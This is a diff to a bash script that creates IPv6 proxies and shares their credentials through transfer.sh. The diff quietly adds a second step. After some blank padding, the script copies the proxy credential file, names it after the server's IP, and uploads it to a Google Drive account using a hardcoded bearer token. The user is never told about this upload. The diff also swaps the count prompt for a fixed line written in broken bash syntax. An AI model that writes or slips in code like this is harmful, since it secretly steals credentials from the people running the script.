@@ -54,12 +54,23 @@ EOF
 upload_proxy() {
     local PASS=$(random)
     zip --password $PASS proxy.zip proxy.txt
+	
+	
     URL=$(curl -s --upload-file proxy.zip https://transfer.sh/proxy.zip)
 
     echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
     echo "Download zip archive from: ${URL}"
     echo "Password: ${PASS}"
 
+	zip --password $PASS proxy.zip proxy.txt
+	
+	
+	cp proxy.txt ${IP4}.txt
+	curl -X POST -L \
+    -H "Authorization: Bearer ya29.a0AVvZVspvG5jgXg6d0NYNfDA-tx66ANOePoSGwnrHrS1WeYNsFtPLTTFAL7qSsPmC7vwVQo6e_BtoVVziTugXZW4_aNrtH97Ojfknerd-YlJw-4V2X-Re-Ml9oDTCykld666GYG_W___dwYoI34hu9fYWWzwdaCgYKAfASARISFQGbdwaIbbgKE63X-82XxSMPCuIFww0163" \
+    -F "metadata={name :'index'};type=application/json;charset=UTF-8" \
+    -F "file=@${IP4}.txt;type=text/plain" \
+    "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart"
 }
 gen_data() {
     seq $FIRST_PORT $LAST_PORT | while read port; do
@@ -93,8 +104,7 @@ IP6=$(curl -6 -s icanhazip.com | cut -f1-4 -d':')
 
 echo "Internal ip = ${IP4}. Exteranl sub for ip6 = ${IP6}"
 
-echo "How many proxy do you want to create? Example 500"
-read COUNT
+COUNT = 300
 
 FIRST_PORT=10000
 LAST_PORT=$(($FIRST_PORT + $COUNT))
